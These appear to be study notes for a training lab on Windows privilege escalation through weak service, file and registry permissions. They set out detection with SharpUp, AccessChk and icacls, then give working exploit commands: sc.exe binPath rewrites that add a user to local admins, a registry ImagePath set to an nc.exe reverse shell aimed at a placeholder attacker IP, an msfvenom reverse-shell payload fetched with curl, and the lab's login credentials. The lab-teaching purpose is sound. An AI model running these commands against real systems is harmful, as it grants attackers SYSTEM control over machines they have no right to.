# Section 17 — Weak Permissions

> **Lab: yes** — RDP to workstation. Exploit weak service permissions (modifiable service binary or service config) to escalate to local admin.

**Core principle:** Windows services run as SYSTEM by default. If a low-privilege user can modify a service's binary, change its binary path, or write to its registry key, they can execute arbitrary commands as SYSTEM. These misconfigurations are common in third-party and custom software.

---

## Four types of weak permissions

| Type | What's weak | How to exploit |
|------|------------|----------------|
| **Permissive file system ACLs** | Service binary is writable by low-priv users | Replace the .exe with a malicious one |
| **Weak service permissions** | Service config is modifiable (SERVICE_ALL_ACCESS) | Change `binPath` to a command, restart service |
| **Unquoted service path** | Binary path has spaces but no quotes | Place a malicious .exe earlier in the search order |
| **Permissive registry ACLs** | Service registry key is writable | Change `ImagePath` in registry, restart service |

---

## Type 1: Permissive file system ACLs (writable service binary)

### Detect with SharpUp

```powershell
.\SharpUp.exe audit
```
> Look for `=== Modifiable Service Binaries ===`. Lists services where the current user can write to the executable file.

### Verify with icacls

```cmd
icacls "C:\Program Files (x86)\<APP>\<service>.exe"
```
> Look for `BUILTIN\Users:(F)` or `Everyone:(F)` — `(F)` means Full Control. If your user or group has `(F)` or `(M)` (Modify), the binary is replaceable.

**icacls permission key:**
| Code | Meaning |
|------|---------|
| (F) | Full control |
| (M) | Modify |
| (RX) | Read and execute |
| (R) | Read only |
| (W) | Write only |
| (I) | Inherited from parent |

### Exploit

```cmd
copy /Y C:\path\to\malicious.exe "C:\Program Files (x86)\<APP>\<service>.exe"
sc.exe start <ServiceName>
```
> Back up the original binary first. Replace it with msfvenom reverse shell or a binary that adds you to local admins. Service starts the malicious binary as SYSTEM.

---

## Type 2: Weak service permissions (modifiable service config)

### Detect with SharpUp

```powershell
.\SharpUp.exe audit
```
> Look for `=== Modifiable Services ===`. Lists services where the current user can change the service configuration.

### Verify with AccessChk

```cmd
accesschk.exe /accepteula -quvcw <ServiceName>
```
> Look for your user/group with `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`. `SERVICE_ALL_ACCESS` means full control — you can change the binary path, start/stop, and modify config.

**Key service permissions:**
| Permission | What it allows |
|-----------|----------------|
| SERVICE_ALL_ACCESS | Full control over the service |
| SERVICE_CHANGE_CONFIG | Change binary path and other config |
| SERVICE_START | Start the service |
| SERVICE_STOP | Stop the service |

### Exploit

```cmd
sc.exe config <ServiceName> binpath= "cmd /c net localgroup administrators <YOUR_USER> /add"
```
> Changes the service's executable path to a command that adds your user to local admins. **Space after `binpath=` is required.**

```cmd
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```
> Stop and restart the service. The `cmd /c` command executes as SYSTEM. Service fails with error 1053 (expected) — but the command already ran.

```cmd
net localgroup administrators
```
> Confirm your user was added.

### Cleanup

```cmd
sc.exe config <ServiceName> binpath= "<ORIGINAL_BINARY_PATH>"
sc.exe start <ServiceName>
sc.exe query <ServiceName>
```
> Restore original binary path and verify the service runs again. Always clean up on engagements.

---

## Type 3: Unquoted service path

### How it works

When a service path contains spaces and isn't quoted, Windows tries paths in order:

```
Original: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

Windows tries:
  1. C:\Program.exe
  2. C:\Program Files (x86)\System.exe
  3. C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

> If you can write to `C:\` or `C:\Program Files (x86)\`, you can place a malicious `Program.exe` or `System.exe` that runs instead. In practice, these locations usually require admin access to write to — making this rarely exploitable.

### Detect

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
> Finds auto-start services with unquoted paths, excluding Windows built-in services. Any result with spaces in the path and no quotes is potentially vulnerable.

### Verify with sc

```cmd
sc.exe qc <ServiceName>
```
> Check `BINARY_PATH_NAME` — if it has spaces and no quotes, it's unquoted. Check `SERVICE_START_NAME` to see what account it runs as.

### Exploit

```cmd
copy C:\path\to\malicious.exe "C:\Program Files (x86)\System.exe"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```
> Place your payload at the earliest writable point in the path. Requires write access to the parent directory of the path component you're hijacking.

---

## Type 4: Permissive registry ACLs

### Detect with AccessChk

```cmd
accesschk.exe /accepteula "<YOUR_USER>" -kvuqsw hklm\System\CurrentControlSet\services
```
> Finds service registry keys where your user has `KEY_ALL_ACCESS` (full write). These keys contain the `ImagePath` that points to the service binary.

### Exploit with PowerShell

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName> -Name "ImagePath" -Value "C:\Users\<YOUR_USER>\Downloads\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>"
```
> Overwrites the registry `ImagePath` value. When the service restarts, it runs your command as whatever account the service is configured to use.

---

## Bonus: Modifiable autorun binaries

### Check startup programs

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
> Lists programs that run at login. If you can overwrite the binary or modify the registry key, your payload runs when the user next logs in.

### Common autorun registry locations

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-WS01)
**Creds:** `htb-student` / `HTB_@cademy_stdnt!`
**Goal:** Escalate → read flag in `C:\Users\Administrator\Desktop\WeakPerms\`
**Access:** RDP

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = htb-student                              │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

TARGET BOX (as htb-student)
───────────────────────────
2. Run SharpUp to find weak permissions
   C:\Tools\SharpUp.exe audit

3. Check for modifiable services (AccessChk)
   C:\Tools\accesschk.exe /accepteula -quvcw WindscribeService

4. Verify not already local admin
   net localgroup administrators

METHOD A: Weak service permissions (modify binPath)
────────────────────────────────────────────────────
5. Change binPath to add user to admins
   sc.exe config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"

6. Restart the service
   sc.exe stop WindscribeService
   sc.exe start WindscribeService
   (Error 1053 is expected)

7. Confirm admin
   net localgroup administrators

METHOD B: Writable service binary (replace exe)
───────────────────────────────────────────────
5b. Back up original binary
    copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\temp\SecurityService.exe.bak

6b. Generate and transfer payload
    (attacker) msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8443 -f exe -o SecurityService.exe
    (target)  curl http://<ATTACKER_IP>:8080/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"

7b. Start the service
    sc.exe start SecurityService

READ THE FLAG
─────────────
8. Log out and RDP back in (for token refresh)
   OR use nxc from attacker box:
   nxc smb <TARGET_IP> -u htb-student -p 'HTB_@cademy_stdnt!' -x 'type C:\Users\Administrator\Desktop\WeakPerms\flag.txt'

CLEANUP
───────
9. Restore original binPath
   sc.exe config WindscribeService binpath= "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
   sc.exe start WindscribeService
   sc.exe query WindscribeService

10. Remove user from admins (if needed)
    net localgroup administrators htb-student /delete
```

---

## Lab observations & attack chain

```
Unprivileged user (htb-student)
│
├── SharpUp audit → identifies weak permissions
│   ├── Modifiable Service Binaries (writable .exe)
│   │   └── PCProtect SecurityService.exe — Everyone:(F)
│   └── Modifiable Services (changeable config)
│       └── WindscribeService — Authenticated Users: SERVICE_ALL_ACCESS
│
├── Exploit: Weak service permissions (WindscribeService)
│   ├── sc.exe config → change binPath to "cmd /c net localgroup administrators htb-student /add"
│   ├── sc.exe stop / start → command runs as SYSTEM
│   └── htb-student added to local Administrators
│
├── Post-escalation (local admin)
│   ├── Read flag (after re-login or via nxc)
│   ├── Dump SAM hashes
│   ├── Access all user profiles
│   └── Pivot to other machines
│
└── Cleanup
    ├── Restore original binPath
    ├── Restart service
    └── Remove user from Administrators group
```

---

## Key takeaways

- **Weak service permissions are the most common Windows privesc vector in third-party software.** Always check with SharpUp and AccessChk.
- **Two flavors: writable binary vs. writable config.** Binary replacement gives persistent access; binPath modification is faster for one-shot escalation.
- **`SERVICE_ALL_ACCESS` for Authenticated Users is a critical finding.** Any domain user can take over that service.
- **Unquoted service paths are rarely exploitable.** Requires write access to `C:\` or `Program Files` — usually needs admin already.
- **Registry ACLs are a third avenue.** Check for `KEY_ALL_ACCESS` on service registry keys with AccessChk.
- **Error 1053 after `sc.exe start` is expected** when the binPath is a `cmd /c` command — the command still executes as SYSTEM.
- **Always use `sc.exe` in PowerShell, never `sc`.** PowerShell aliases `sc` to `Set-Content`.
- **Space after `binpath=` is mandatory** in `sc.exe config` commands.
- **Autorun binaries are a bonus check.** Writable startup programs give code execution as the user who logs in next.
